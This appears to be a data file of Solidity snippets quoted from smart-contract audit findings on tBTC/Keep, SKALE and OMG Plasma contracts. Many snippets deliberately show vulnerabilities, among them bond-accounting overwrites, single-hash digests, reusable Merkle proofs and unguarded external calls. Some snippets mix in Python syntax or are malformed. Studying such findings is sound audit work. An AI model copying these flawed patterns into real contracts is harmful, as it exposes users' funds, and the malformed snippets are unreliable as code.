"```\nfunction closeKeep() external onlyOwner onlyWhenActive {\n    require(\n       !isSigningInProgress() || hasSigningTimedOut(),\n        ""Requested signing has not timed out yet""\n    );\n\n    isActive = false;\n\n    freeMembersBonds();\n\n    emit KeepClosed();\n}\n\nfunction freeMembersBonds() internal {\n    for (uint256 i = 0; i < members.length; i++) {\n        keepBonding.freeBond(members[i], uint256(address(this)));\n    }\n}\n```\n```\nfunction freeBond(address operator, uint256 referenceID) public {\n    address holder = msg.sender;\n    bytes32 bondID = keccak256(abi.encodePacked(operator, holder, referenceID));\n\n    require(lockedBonds[bondID] > 0, ""Bond not found"");\n\n    uint256 amount = lockedBonds[bondID];\n    lockedBonds[bondID] = 0;\n    unbondedValue[operator] = amount;\n}\n```"
```\nif (block.timestamp > _d.fundingProofTimerStart + TBTCConstants.getFundingTimeout()) {\n    address(0).transfer(address(this).balance);  // Burn it all down\n    _d.setFailedSetup()\n}
"```\nfunction wpkhSpendSighash(\n    bytes memory _outpoint,  // 36 byte UTXO id\n    bytes20 _inputPKH,       // 20 byte hash160\n    bytes8 _inputValue,      // 8-byte LE\n    bytes8 _outputValue,     // 8-byte LE\n    bytes memory _outputScript    // length-prefixed output script\n) internal pure returns (bytes32) {\n    bytes memory _scriptCode = abi.encodePacked(\n        hex""1976a914"",  // length, dup, hash160, pkh_length\n        _inputPKH,\n        hex""88ac""\n    );\n    bytes32 _hashOutputs = abi.encodePacked(_outputValue, _outputScript).hash256();\n    bytes memory _sighashPreimage = abi.encodePacked(\n        hex""01000000"",  // version\n        _outpoint.hash256(),\n        hex""8cb9012517c817fead650287d61bdd9c68803b6bf9c64133dcab3e65b5a50cb9"",  // hashSequence(00000000)\n        _outpoint,  // outpoint\n        _scriptCode,  // p2wpkh script code\n        _inputValue,  // value of the input in 8-byte LE\n        hex""00000000"",  // input nSequence\n        _hashOutputs,  // hash of the single output\n        hex""00000000"",  // nLockTime\n        hex""01000000""  // SIGHASH_ALL\n    );\n    return _sighashPreimage.hash256();\n}\n```"
"```\nfunction purchaseSignerBondsAtAuction(DepositUtils.Deposit storage _d) public {\n    bool _wasFraud = _d.inFraudLiquidationInProgress();\n    require(_d.inSignerLiquidation(), ""No active auction"");\n\n    _d.setLiquidated();\n    _d.logLiquidated();\n\n    address tdtHolder = _d.depositOwner();\n\n    TBTCToken _tbtcToken = TBTCToken(_d.TBTCToken);\n\n    uint256 lotSizeTbtc = _d.lotSizeTbtc();\n    require(_tbtcToken.balanceOf(msg.sender) >= lotSizeTbtc, ""Not enough TBTC to cover outstanding debt"");\n\n    if (tdtHolder == _d.VendingMachine) {\n        _tbtcToken.burnFrom(msg.sender, lotSizeTbtc);  // burn minimal amount to cover size\n    } else {\n        _tbtcToken.transferFrom(msg.sender, tdtHolder, lotSizeTbtc);\n    }\n\n    // Distribute funds to auction buyer\n    uint256 _valueToDistribute = _d.auctionValue();\n    msg.sender.transfer(_valueToDistribute);\n\n    // Send any TBTC left to the Fee Rebate Token holder\n    _d.distributeFeeRebate();\n\n    // For fraud, pay remainder to the liquidation initiator.\n    // For non-fraud, split 50-50 between initiator and signers. if the transfer amount is 1,\n    // division will yield a 0 value which causes a revert; instead, \n    // we simply ignore such a tiny amount and leave some wei dust in escrow\n    uint256 contractEthBalance = address(this).balance;\n    address payable initiator = _d.liquidationInitiator;\n\n    if (initiator == address(0)) {\n        initiator = address(0xdead);\n    }\n    if (contractEthBalance > 1) {\n        if (_wasFraud) {\n            initiator.transfer(contractEthBalance);\n        } else {\n            // There will always be a liquidation initiator.\n            uint256 split = contractEthBalance.div(2);\n            _d.pushFundsToKeepGroup(split);\n            initiator.transfer(split);\n        }\n    }\n}"
"```\nuint _idx = _index;\nbytes32 _root = _proof.slice(_proof.length - 32, 32).toBytes32();\nbytes32 _current = _proof.slice(0, 32).toBytes32();\n\nfor (uint i = 1; i < (_proof.length / 32) - 1; i++) {\n    if (_idx % 2 == 1) {\n        _current = _hash256MerkleStep(_proof.slice(i * 32, 32), abi.encodePacked(_current));\n    } else {\n        _current = _hash256MerkleStep(abi.encodePacked(_current), _proof.slice(i * 32, 32));\n    }\n    _idx = _idx + 1;\n}\nreturn _current == _root;\n```\n```\nit('verifies a bitcoin merkle root', async () => {\n  for (let i = 0; i < verifyHash256Merkle.length; i += 1) {\n    const res = await instance.verifyHash256Merkle(\n      verifyHash256Merkle[i].input.proof,\n      verifyHash256Merkle[i].input.index\n    ); // 0-indexed\n    assert.strictEqual(res, verifyHash256Merkle[i].output);\n\n    let pLen = verifyHash256Merkle[i].input.proof.length;\n    let height = Math.floor((pLen - 2) / 64) - 2;\n\n    if (verifyHash256Merkle[i].output && height >= 1) {\n      let altIdx = (2 ** height) + verifyHash256Merkle[i].input.index;\n\n      const resNext = await instance.verifyHash256Merkle(\n        verifyHash256Merkle[i].input.proof,\n        altIdx\n      );\n\n      assert.strictEqual(resNext, verifyHash256Merkle[i].output);\n\n      console.log('Verified transaction twice!');\n    }\n  }\n});\n```"
```\nbool notUndelegated = block.number <= operator.undelegatedAt || operator.undelegatedAt == 0;\n\nif (isAuthorized && isActive && notUndelegated) {\n    balance = operator.amount;\n}\n```
"```\n/**\n * @dev Slash provided token amount from every member in the misbehaved operators array and burn 100% of all the tokens.\n * @param amount Token amount to slash from every misbehaved operator.\n * @param misbehavedOperators Array of addresses to seize the tokens from.\n */\nfunction slash(uint256 amount, address[] memory misbehavedOperators)\n    public\n    onlyApprovedOperatorContract(msg.sender) {\n    for (uint i = 0; i < misbehavedOperators.length; i++) {\n        address operator = misbehavedOperators[i];\n        require(authorizations[msg.sender][operator], ""Not authorized"");\n        operators[operator].amount = operators[operator].amount.sub(amount);\n    }\n\n    token.burn(misbehavedOperators.length.mul(amount));\n}\n\n/**\n * @dev Seize provided token amount from every member in the misbehaved operators array. The tattletale is rewarded with 5% of the total seized amount scaled by the reward adjustment parameter and the rest 95% is burned.\n * @param amount Token amount to seize from every misbehaved operator.\n * @param rewardMultiplier Reward adjustment in percentage. Min 1% and 100% max.\n * @param tattletale Address to receive the 5% reward.\n * @param misbehavedOperators Array of addresses to seize the tokens from.\n */\nfunction seize(\n    uint256 amount,\n    uint256 rewardMultiplier,\n    address tattletale,\n    address[] memory misbehavedOperators\n) public onlyApprovedOperatorContract(msg.sender) {\n    for (uint i = 0; i < misbehavedOperators.length; i++) {\n        address operator = misbehavedOperators[i];\n        require(authorizations[msg.sender][operator], ""Not authorized"");\n        operators[operator].amount = operators[operator].amount.sub(amount);\n    }\n\n    uint256 total = misbehavedOperators.length.mul(amount);\n    uint256 tattletaleReward = (total.mul(5).div(100)).mul(rewardMultiplier).div(100);\n\n    token.transfer(tattletale, tattletaleReward);\n    token.burn(total.sub(tattletaleReward));\n}\n```"
"```\nfunction submitSignatureFraud(\n    uint8 _v,\n    bytes32 _r,\n    bytes32 _s,\n    bytes32 _signedDigest,\n    bytes calldata _preimage\n) external returns (bool _isFraud) {\n    require(publicKey.length!= 0, ""Public key was not set yet"");\n\n    bytes32 calculatedDigest = sha256(_preimage);\n    require(\n        _signedDigest == calculatedDigest,\n        ""Signed digest does not match double sha256 hash of the preimage""\n    );\n\n    bool isSignatureValid = publicKeyToAddress(publicKey) ==\n        ecrecover(_signedDigest, _v, _r, _s);\n\n    require(isSignatureValid &&!digests[_signedDigest], ""Signature is not fraudulent"");\n\n    return true;\n}"
"```\n/**\n * @dev Slash provided token amount from every member in the misbehaved operators array and burn 100% of all the tokens.\n * @param amount Token amount to slash from every misbehaved operator.\n * @param misbehavedOperators Array of addresses to seize the tokens from.\n */\nfunction slash(uint256 amount, address[] memory misbehavedOperators)\n    public\n    onlyApprovedOperatorContract(msg.sender) {\n    for (uint i = 0; i < misbehavedOperators.length; i++) {\n        address operator = misbehavedOperators[i];\n        require(authorizations[msg.sender][operator], ""Not authorized"");\n        operators[operator].amount = operators[operator].amount.sub(amount);\n    }\n\n    token.burn(misbehavedOperators.length.mul(amount));\n}\n```"
"```\n/// @notice Goes from courtesy call to active\n/// @dev Only callable if collateral is sufficient and the deposit is not expiring\nfunction exitCourtesyCall(DepositUtils.Deposit storage _d) public {\n    require(_d.inCourtesyCall(), ""Not currently in courtesy call"");\n    require(block.timestamp <= _d.fundedAt + TBTCConstants.getDepositTerm(), ""Deposit is expiring"");\n    require(getCollateralizationPercentage(_d) >= _d.undercollateralizedThresholdPercent, ""Deposit is still undercollateralized"");\n    _d.setActive();\n    _d.logExitedCourtesyCall();\n}\n```"
"```\nfunction withdraw(uint256 amount, address payable destination) public {\n    require(unbondedValue[msg.sender] >= amount, ""Insufficient unbonded value"");\n\n    unbondedValue[msg.sender] -= amount;\n\n    (bool success, ) = destination.call.value(amount)("""");\n    require(success, ""Transfer failed"");\n}\n```\n```\nfunction withdraw(address _member) external {\n    uint256 value = memberETHBalances[_member];\n    memberETHBalances[_member] = 0;\n\n    (bool success,) = tokenStaking.magpieOf(_member).call.value(value)("""");\n    require(success, ""Transfer failed"");\n}\n```"
"```\nrequire(block.timestamp >= _d.withdrawalRequestTime + TBTCConstants.getIncreaseFeeTimer(), ""Fee increase not yet permitted"")\n```\n```\nuint256 _previousOutputValue = DepositUtils.bytes8LEToUint(_previousOutputValueBytes);\n_newOutputValue = DepositUtils.bytes8LEToUint(_newOutputValueBytes);\nrequire(_previousOutputValue.sub(_newOutputValue) == _d.initialRedemptionFee, ""Not an allowed fee step"");"
```\nif (contractEthBalance > 1) {\n    if (_wasFraud) {\n        initiator.transfer(contractEthBalance);\n    } else {\n        uint256 split = contractEthBalance.div(2);\n        _d.pushFundsToKeepGroup(split);\n        initiator.transfer(split);\n    }\n}\n```
"```\nfunction approveAndCall(address _spender, uint256 _tdtId, bytes memory _extraData) public returns (bool success) {\n    tokenRecipient spender = tokenRecipient(_spender);\n    approve(_spender, _tdtId);\n    spender.receiveApproval(msg.sender, _tdtId, address(this), _extraData);\n}\n```"
"```\nfunction extractInputTxIdLE(bytes memory _input) internal pure returns (bytes32) {\n    return _input.slice(0, 32).toBytes32();\n}\n```\n```\nuint _idx = _index;\nbytes32 _root = _proof.slice(_proof.length - 32, 32).toBytes32();\nbytes32 _current = _proof.slice(0, 32).toBytes32();\n\nfor (uint i = 1; i < (_proof.length / 32) - 1; i++) {\n    if (_idx % 2 == 1) {\n        _current = _hash256MerkleStep(_proof.slice(i * 32, 32), abi.encodePacked(_current));\n    } else {\n        _current = _hash256MerkleStep(abi.encodePacked(_current), _proof.slice(i * 32, 32));\n    }\n    _idx = _idx + 1;\n}\nreturn _current == _root;\n```"
```\nif (_headers.length % 80!= 0):\n    return ERR_BAD_LENGTH\n```
"```\nfunction accountFromPubkey(bytes memory _pubkey) internal pure returns (address) {\n    require(_pubkey.length == 64, ""Pubkey must be 64-byte raw, uncompressed key."");\n\n    bytes32 _digest = keccak256(_pubkey);\n    return address(uint160(uint256(_digest)));\n}\n```"
"```\nfunction toBytes32(bytes memory _source) pure internal returns (bytes32 result) {\n    bytes memory tempEmptyStringTest = bytes(_source);\n    if (tempEmptyStringTest.length == 0) {\n        return 0x0;\n    }\n\n    assembly {\n        result := mload(add(_source, 32))\n    }\n}\n```"
"```\nfunction hash256(bytes memory _b) internal pure returns (bytes32) {\n    return abi.encodePacked(sha256(abi.encodePacked(sha256(_b)))).toBytes32();\n}\n```\n```\nfunction hash256View(bytes memory _b) internal view returns (bytes32 res) {\n    assembly {\n        let ptr := mload(0x40)\n        pop(staticcall(gas, 2, add(_b, 32), mload(_b), ptr, 32))\n        pop(staticcall(gas, 2, ptr, 32, ptr, 32))\n        res := mload(ptr)\n    }\n}\n```"
```\nfunction hash256(bytes memory _b) internal pure returns (bytes32) {\n    return abi.encodePacked(sha256(abi.encodePacked(_b))).toBytes32();\n}\n```
"```\nstruct Deposit {\n    address TBTCSystem;\n    address TBTCToken;\n    address TBTCDepositToken;\n    address FeeRebateToken;\n    address VendingMachine;\n    uint256 lotSizeSatoshis;\n    uint8 currentState;\n    uint256 signerFeeDivisor;\n    uint128 undercollateralizedThresholdPercent;\n    uint128 severelyUndercollateralizedThresholdPercent;\n}\n```\ncontract DepositFactory is CloneFactory, TBTCSystemAuthority {\n    address public masterDepositAddress;\n    address public tbtcSystem;\n    address public tbtcToken;\n    address public tbtcDepositToken;\n    address public feeRebateToken;\n    address public vendingMachine;\n    uint256 public keepThreshold;\n    uint256 public keepSize;\n}"
```\npublic tbtcSystem address;
"```\nbytes4 functionSignature;\nassembly {\n    functionSignature := mload(add(_extraData, 0x20))\n}\nrequire(\n    functionSignature == vendingMachine.unqualifiedDepositToTbtc.selector,\n    ""Bad _extraData signature. Call must be to unqualifiedDepositToTbtc.""\n)\n```\n```\nbytes4 functionSignature;\nassembly {\n    functionSignature := mload(add(_extraData, 0x20))\n}\nrequire(\n    functionSignature == vendingMachine.tbtcToBtc.selector,\n    ""Bad _extraData signature. Call must be to tbtcToBtc.""\n);\n```"
"```\n(bool success, bytes memory returnData) = address(vendingMachine).call(_extraData);\nrequire(success, string(returnData));\n```\n```\n(bool success, bytes memory returnData) = address(vendingMachine).call(_extraData);\n\nrequire(success, string(returnData));\n```"
```\nuint256 pausedDuration = 10 days;\n```
"```\nconstructor(address _depositFactory) public {\n    ERC721Metadata(""tBTC Deposit Token"", ""TDT"");\n    DepositFactoryAuthority(_depositFactory);\n}\n```"
"```\nif (totalRefundBaseTokens > 0) {\n    baseToken.safeTransferFrom(address(this), _recipient, baseTokenID, totalRefundBaseTokens, """");\n}\n\ntoken.safeBatchTransferFrom(address(this), _recipient, _tokenIds, _tokensBoughtAmounts, """");\n```\n```\nbaseToken.safeTransferFrom(\n    address(this),\n    _provider,\n    baseTokenID,\n    totalBaseTokens,\n    """"\n);\n\ntoken.safeBatchTransferFrom(\n    address(this),\n    _provider,\n    _tokenIds,\n    tokenAmounts,\n    """"\n)\n```\nbatchMint(_provider, _tokenIds, liquiditiesToMint, """");\n\nbaseToken.safeTransferFrom(_provider, address(this), baseTokenID, totalBaseTokens, abi.encode(DEPOSIT_SIG));\n```"
"```\nfunction sendEth(address payable[] memory _to, uint256[] memory _value) public restrictedToOwner payable returns (bool _success) {\n    require(_to.length == _value.length);\n    require(_to.length <= 255);\n\n    uint256 beforeValue = msg.value;\n    uint256 afterValue = 0;\n\n    for (uint8 i = 0; i < _to.length; i++) {\n        afterValue = afterValue.add(_value[i]);\n        assert(_to[i].send(_value[i]));\n    }\n\n    uint256 remainingValue = beforeValue.sub(afterValue);\n    if (remainingValue > 0) {\n        assert(msg.sender.send(remainingValue));\n    }\n    return true;\n}\n```"
```\nERC20 token = ERC20(_tokenAddress);\n```
"```\nassert \n```\n```\nassert(_to[i].send(_value[i]))\n```\n```\nassert(msg.sender.send(remainingValue));\n```\n```\nassert(token.transferFrom(msg.sender, _to[i], _value[i]) == true)\n```"
"```\nuint holderBalance = \n    SkaleToken(contractManager.getContract(""SkaleToken"")).balanceOf(holder);\n\nuint lockedToDelegate = \n    tokenState.getLockedCount(holder) - \n    tokenState.getPurchasedAmount(holder);\n\nrequire(\n    holderBalance >= \n    amount + \n    lockedToDelegate, \n    ""Delegator hasn't enough tokens to delegate""\n);"
"```\nuint locked = _getLockedOf(from);\nif (locked > 0) {\n    require(_balances[from] >= locked + amount, ""Token should be unlocked for transferring"");\n}\n\n_balances[from] = _balances[from].sub(amount);\n_balances[to] = _balances[to].add(amount);\n```"
"```\nfunction linkNodeAddress(address validatorAddress, address nodeAddress) external allow(""DelegationService"") {\n    uint validatorId = getValidatorId(validatorAddress);\n    require(_validatorAddressToId[nodeAddress] == 0, ""Validator cannot override node address"");\n    _validatorAddressToId[nodeAddress] = validatorId;\n}\n\nfunction unlinkNodeAddress(address validatorAddress, address nodeAddress) external allow(""DelegationService"") {\n    uint validatorId = getValidatorId(validatorAddress);\n    require(_validatorAddressToId[nodeAddress] == validatorId, ""Validator hasn't permissions to unlink node"");\n    _validatorAddressToId[nodeAddress] = 0;\n}\n```"
```\nif (_isPurchased[delegationId]) {\n    address holder = delegation.holder;\n    _totalDelegated[holder] += delegation.amount;\n    if (_totalDelegated[holder] >= _purchased[holder]) {\n        purchasedToUnlocked(holder);\n    }\n```
"```\nskaleBalances.lockBounty(\n    shares[i].holder,\n    timeHelpers.addMonths(delegationStarted, 3)\n)"
"```\nfunction getLockedCount(address holder) external returns (uint amount) {\n    amount = 0;\n    DelegationController delegationController = DelegationController(contractManager.getContract(""DelegationController""));\n    uint[] memory delegationIds = delegationController.getDelegationsByHolder(holder);\n\n    for (uint i = 0; i < delegationIds.length; i++) {\n        uint id = delegationIds[i];\n        if (isLocked(getState(id))) {\n            amount += delegationController.getDelegation(id).amount;\n        }\n    }\n\n    return amount + getPurchasedAmount(holder) + this.getSlashedAmount(holder);\n}\n```"
```\nif (_isPurchased[delegationId]) {\n    address holder = delegation.holder;\n    _totalDelegated[holder] += delegation.amount;\n    if (_totalDelegated[holder] >= _purchased[holder]) {\n        purchasedToUnlocked(holder);\n    }\n}\n```
```\nif (_isPurchased[delegationId]) {\n    address holder = delegation.holder;\n    _totalDelegated[holder] += delegation.amount;\n    if (_totalDelegated[holder] >= _purchased[holder]) {\n        purchasedToUnlocked(holder);\n    }\n}\n```
"```\nif (_purchased[delegation.holder] > 0):\n    _isPurchased[delegationId] = True\n    if (_purchased[delegation.holder] > delegation.amount):\n        _purchased[delegation.holder] -= delegation.amount\n    else:\n        _purchased[delegation.holder] = 0\nelse:\n    _isPurchased[delegationId] = False\n```\n```\nfunction _cancel(uint delegationId, DelegationController.Delegation memory delegation) internal returns (State state) {\n    if (_isPurchased[delegationId]) {\n        state = purchasedProposedToPurchased(delegationId, delegation);\n    } else {\n        state = proposedToUnlocked(delegationId);\n    }\n}"
"```\nfor (uint i = 0; i < shares.length; ++i) {\n    skaleToken.send(address(skaleBalances), shares[i].amount, abi.encode(shares[i].holder));\n\n    uint created = delegationController.getDelegation(shares[i].delegationId).created;\n    uint delegationStarted = timeHelpers.getNextMonthStartFromDate(created);\n    skaleBalances.lockBounty(shares[i].holder, timeHelpers.addMonths(delegationStarted, 3));\n}\n```\n```\nfunction slash(uint validatorId, uint amount) external only(""SkaleDKG"") {\n    ValidatorService validatorService = ValidatorService(contractManager.getContract(""ValidatorService""));\n    require(validatorService.validatorExists(validatorId), ""Validator does not exist"");\n\n    Distributor distributor = Distributor(contractManager.getContract(""Distributor""));\n    TokenState tokenState = TokenState(contractManager.getContract(""TokenState""));\n\n    Distributor.Share[] memory shares = distributor.distributePenalties(validatorId, amount);\n    for (uint i = 0; i < shares.length; i++) {\n        tokenState.slash(shares[i].delegationId, shares[i].amount);\n    }\n}\n```"
"```\nrequire(\n    (validatorNodes.length + 1) * msr <= delegationsTotal,\n    ""Validator has to meet Minimum Staking Requirement""\n);"
```\nfunction enableValidator(uint validatorId) external checkValidatorExists(validatorId) onlyOwner {\n    trustedValidators[validatorId] = true;\n}\n\nfunction disableValidator(uint validatorId) external checkValidatorExists(validatorId) onlyOwner {\n    trustedValidators[validatorId] = false;\n}\n```
```\nfunction getPurchasedAmount(address holder) public returns (uint amount) {\n    for (uint i = 0; i < _endingDelegations[holder].length; ++i) {\n        getState(_endingDelegations[holder][i]);\n    }\n    return _purchased[holder];\n}
"```\nfunction getAllDelegationRequests() external returns(uint[] memory) {\n    revert(""Not implemented"");\n}\n\nfunction getDelegationRequestsForValidator(uint validatorId) external returns(uint[] memory) {\n    revert(""Not implemented"");\n}\n```"
"```\nfunction setState(uint delegationId, State newState) internal {\n    TimeHelpers timeHelpers = TimeHelpers(contractManager.getContract(""TimeHelpers""));\n    DelegationController delegationController = DelegationController(contractManager.getContract(""DelegationController""));\n\n    require(newState!= State.PROPOSED, ""Can't set state to proposed"");\n\n    if (newState == State.ACCEPTED) {\n        State currentState = getState(delegationId);\n        require(currentState == State.PROPOSED, ""Can't set state to accepted"");\n\n        _state[delegationId] = State.ACCEPTED;\n        _timelimit[delegationId] = timeHelpers.getNextMonthStart();\n    } else if (newState == State.DELEGATED) {\n        revert(""Can't set state to delegated"");\n    } else if (newState == State.ENDING_DELEGATED) {\n        require(getState(delegationId) == State.DELEGATED, ""Can't set state to ending delegated"");\n        DelegationController.Delegation memory delegation = delegationController.getDelegation(delegationId);\n\n        _state[delegationId] = State.ENDING_DELEGATED;\n        _timelimit[delegationId] = timeHelpers.calculateDelegationEndTime(delegation.created, delegation.delegationPeriod, 3);\n        _endingDelegations[delegation.holder].push(delegationId);\n    } else {\n        revert(""Unknown state"");\n    }\n}"
"```\nuint locked = _getAndUpdateLockedAmount(from);\nif (locked > 0) {\n    require(_balances[from] >= locked.add(amount), ""Token should be unlocked for burning"");\n}\n\n_getCallTokensToSend(\n    operator, from, address(0), amount, data, operatorData\n);\n\n_totalSupply = _totalSupply.sub(amount);\n_balances[from] = _balances[from].sub(amount);\n```"
"```\nfunction confiscate(uint validatorId, uint amount) external {\n    uint currentMonth = getCurrentMonth();\n    Fraction memory coefficient = reduce(_delegatedToValidator[validatorId], amount, currentMonth);\n    reduce(_effectiveDelegatedToValidator[validatorId], coefficient, currentMonth);\n    putToSlashingLog(_slashesOfValidator[validatorId], coefficient, currentMonth);\n    _slashes.push(SlashingEvent({reducingCoefficient: coefficient, validatorId: validatorId, month: currentMonth}));\n}\n```\n```\nif (oldValue > 0):\n    reduce(\n        _delegatedByHolderToValidator[holder][validatorId],\n        _delegatedByHolder[holder],\n        _slashes[index].reducingCoefficient,\n        month\n    )\n    reduce(\n        _effectiveDelegatedByHolderToValidator[holder][validatorId],\n        _slashes[index].reducingCoefficient,\n        month\n    )\n    slashingSignals[index.sub(begin)].holder = holder\n    slashingSignals[index.sub(begin)].penalty = oldValue.sub(getAndUpdateDelegatedByHolderToValidator(holder, validatorId, month))\n```\n```\nuint amountAfterSlashing = calculateDelegationAmountAfterSlashing(delegationId);\n```"
"```\nuint oldValue = getAndUpdateDelegatedByHolderToValidator(holder, validatorId);\nif (oldValue > 0) {\n    uint month = _slashes[index].month;\n    reduce(\n        _delegatedByHolderToValidator[holder][validatorId],\n        _delegatedByHolder[holder],\n        _slashes[index].reducingCoefficient,\n        month\n    );\n    slashingSignals[index.sub(begin)].holder = holder;\n    slashingSignals[index.sub(begin)].penalty = oldValue.sub(getAndUpdateDelegatedByHolderToValidator(holder, validatorId));\n}\n```"
"```\nfor (uint i = sequence.firstUnprocessedMonth; i <= month; ++i) {\n    sequence.value = sequence.value.add(sequence.addDiff[i]).sub(sequence.subtractDiff[i]);\n    delete sequence.addDiff[i];\n    delete sequence.subtractDiff[i];\n}\n```\n```\nfunction handleSlash(address holder, uint amount) external {\n    _locked[holder] = _locked[holder].add(amount);\n}\n```"
"```\nfunction reduce(PartialDifferencesValue storage sequence, uint amount, uint month) internal returns (Fraction memory) {\n    require(month.add(1) >= sequence.firstUnprocessedMonth, ""Can't reduce value in the past"");\n    if (sequence.firstUnprocessedMonth == 0) {\n        return createFraction(0);\n    }\n    uint value = getAndUpdateValue(sequence, month);\n    if (value == 0) {\n        return createFraction(0);\n    }\n\n    uint _amount = amount;\n    if (value < amount) {\n        _amount = value;\n    }\n\n    Fraction memory reducingCoefficient = createFraction(value.sub(_amount), value);\n    reduce(sequence, reducingCoefficient, month);\n    return reducingCoefficient;\n}\n\nfunction reduce(PartialDifferencesValue storage sequence, Fraction memory reducingCoefficient, uint month) internal {\n    reduce(sequence, sequence, reducingCoefficient, month, false);\n}\n\nfunction reduce(\n    PartialDifferencesValue storage sequence,\n    PartialDifferencesValue storage sumSequence,\n    Fraction memory reducingCoefficient,\n    uint month\n) internal {\n    reduce(sequence, sumSequence, reducingCoefficient, month, true);\n}\n\nfunction reduce(\n    PartialDifferencesValue storage sequence,\n    PartialDifferencesValue storage sumSequence,\n    Fraction memory reducingCoefficient,\n    uint month,\n    bool hasSumSequence\n) internal {\n    require(month.add(1) >= sequence.firstUnprocessedMonth, ""Can't reduce value in the past"");\n    if (hasSumSequence) {\n        require(month.add(1) >= sumSequence.firstUnprocessedMonth, ""Can't reduce value in the past"");\n    }\n    require(reducingCoefficient.numerator <= reducingCoefficient.denominator, ""Increasing of values is not implemented"");\n    if (sequence.firstUnprocessedMonth == 0) {\n        return;\n    }\n    uint value = getAndUpdateValue(sequence, month);\n    if (value == 0) {\n        return;\n    }\n\n    uint newValue = sequence.value.mul(reducingCoefficient.numerator).div(reducingCoefficient.denominator);\n    if (hasSumSequence) {\n        subtract(sumSequence, sequence.value.sub(newValue), month);\n    }\n    sequence.value = newValue;\n\n    for (uint i = month.add(1); i <= sequence.lastChangedMonth; ++i) {\n        uint newDiff = sequence.subtractDiff[i].mul(reducingCoefficient.numerator).div(reducingCoefficient.denominator);\n        if (hasSumSequence) {\n            sumSequence.subtractDiff[i] = sumSequence.subtractDiff[i"
"```\n/**\n * @dev locked status, only applicable before unlock_date\n */\nbool public _is_locked = true;\n\n/**\n * @dev Modifier that only allows function to run if either token is unlocked or time has expired.\n * Throws if called while token is locked.\n */\nmodifier onlyUnlocked() {\n    require(!_is_locked || now > unlock_date);\n    _\n}\n\n/**\n * @dev Internal function that unlocks token. Can only be ran before expiration (give that it's irrelevant after)\n */\nfunction _unlock() internal {\n    require(now <= unlock_date);\n    _is_locked = false;\n}\n```"
"```\nuint256 j = index;\n\nfor (uint256 i = 32; i <= proof.length; i += 32) {\n    assembly {\n        proofElement := mload(add(proof, i))\n    }\n    if (j % 2 == 0) {\n        computedHash = keccak256(abi.encodePacked(NODE_SALT, computedHash, proofElement));\n    } else {\n        computedHash = keccak256(abi.encodePacked(NODE_SALT, proofElement, computedHash));\n    }\n    j = j / 2;\n}\n```\n```\nit('should accidentally allow different indices to use the same proof', async () => {\n  const rootHash = this.merkleTree.root;\n  const proof = this.merkleTree.getInclusionProof(leaves[2]);\n\n  const result = await this.merkleContract.checkMembership(\n    leaves[2],\n    2,\n    rootHash,\n    proof,\n  );\n  expect(result).to.be.true;\n\n  const nextResult = await this.merkleContract.checkMembership(\n    leaves[2],\n    6,\n    rootHash,\n    proof,\n  );\n  expect(nextResult).to.be.true;\n\n  const nextNextResult = await this.merkleContract.checkMembership(\n    leaves[2],\n    10,\n    rootHash,\n    proof,\n  );\n  expect(nextNextResult).to.be.true;\n})"
"```\nfunction verify(\n    bytes calldata inputTxBytes,\n    uint16 outputIndex,\n    uint256 inputTxPos,\n    bytes calldata spendingTxBytes,\n    uint16 inputIndex,\n    bytes calldata signature\n)\n    external\n    view\n    returns (bool)\n{\n    PaymentTransactionModel.Transaction memory inputTx = PaymentTransactionModel.decode(inputTxBytes);\n    require(inputTx.txType == supportInputTxType, ""Input tx is an unsupported payment tx type"");\n\n    PaymentTransactionModel.Transaction memory spendingTx = PaymentTransactionModel.decode(spendingTxBytes);\n    require(spendingTx.txType == supportSpendingTxType, ""The spending tx is an unsupported payment tx type"");\n\n    UtxoPosLib.UtxoPos memory utxoPos = UtxoPosLib.build(\n        TxPosLib.TxPos(inputTxPos),\n        outputIndex\n    );\n    require(\n        spendingTx.inputs[inputIndex] == bytes32(utxoPos.value),\n        ""Spending tx points to the incorrect output UTXO position""\n    );\n\n    address payable owner = inputTx.outputs[outputIndex].owner();\n    require(\n        owner == ECDSA.recover(eip712.hashTx(spendingTx), signature),\n        ""Tx in not signed correctly""\n    );\n\n    return true;\n}\n```\n```\n/**\n * @notice Registers an exit game within the PlasmaFramework. Only the maintainer can call the function.\n * @dev Emits ExitGameRegistered event to notify clients\n * @param _txType The tx type where the exit game wants to register\n * @param _contract Address of the exit game contract\n * @param _protocol The transaction protocol, either 1 for MVP or 2 for MoreVP\n */\nfunction registerExitGame(uint256 _txType, address _contract, uint8 _protocol) public onlyFrom(getMaintainer()) {\n    require(_txType!= 0, ""Should not register with tx type 0"");\n    require(_contract!= address(0), ""Should not register with an empty exit game address"");\n    require(_exitGames[_txType] == address(0), ""The tx type is already registered"");\n    require(_exitGameToTxType[_contract] == 0, ""The exit game contract is already registered"");\n    require(Protocol.isValidProtocol(_protocol), ""Invalid protocol value"");\n\n    _exitGames[_txType] = _contract;\n    _exitGameToTxType[_contract] = _txType;\n    _protocols[_txType] = _protocol;\n    _exitGameQuarantine.quarantine(_contract);\n\n    emit ExitGameRegistered(_txType, _contract, _protocol);\n}\n```\n```\nawait deployer.deploy(\n    PaymentOutputToPaymentTxCondition,\n    plasmaFramework.address,\n    PAYMENT_OUTPUT_TYPE,\n    PAYMENT_TX_TYPE,\n);\n\nconst paymentToPaymentCondition = await PaymentOutputToPaymentTxCondition.deployed();\n\nawait deployer.deploy(\n    PaymentOutputToPaymentTxCondition,\n    plasmaFramework.address,\n    PAYMENT_OUTPUT_TYPE,\n    PAYMENT_V2_TX_TYPE,\n);\n\nconst paymentToPaymentV2Condition = await PaymentOutputToPaymentTxCondition.deployed();\n```\n```\nconsole.log(`Registering paymentToPaymentCondition (${paymentToPaymentCondition.address}) to spendingConditionRegistry`);\nawait spendingConditionRegistry.registerSpendingCondition(\n  PAYMENT_OUTPUT_TYPE,\n  PAYMENT_TX_TYPE,\n  paymentToPaymentCondition.address,\n);\n\nconsole.log(`Registering paymentToPaymentV2Condition (${paymentToPaymentV2Condition.address}) to spendingConditionRegistry`);\nawait spendingConditionRegistry.registerSpendingCondition(\n  PAYMENT_OUTPUT_TYPE,\n  PAYMENT_V2_TX_TYPE,\n  paymentToPaymentV2Condition.address,\n);\nawait spendingConditionRegistry.renounceOwnership();\n```\n```\nawait plasmaFramework.registerExitGame(\n    PAYMENT_TX_TYPE,\n    paymentExitGame.address,\n    config.frameworks.protocols.moreVp,\n    { from: maintainerAddress }\n);\n```\n```\n/**\n * @notice Registers an exit game within the PlasmaFramework. Only the maintainer can call the function.\n * @dev Emits ExitGameRegistered event to notify clients\n * @param _txType The tx type where the exit game wants to register\n * @param _contract Address of 